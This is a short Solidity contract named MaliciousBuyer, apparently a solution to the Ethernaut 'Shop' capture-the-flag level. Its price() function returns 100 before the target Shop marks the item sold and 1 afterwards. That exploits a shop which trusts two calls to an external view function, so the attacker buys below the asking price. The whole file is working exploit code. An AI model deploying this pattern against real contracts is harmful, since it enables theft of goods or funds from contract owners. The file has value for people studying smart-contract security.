import "./Shop.sol";

pragma solidity ^0.5.0;

contract MaliciousBuyer is Buyer {
    function price() external view returns (uint) {
        // 100 is the asking price
        // harcode it for gas efficiency
        return Shop(msg.sender).isSold() ? 1 : 100;
    }

    function buy(address target) external {
        Shop(target).buy();
    }
}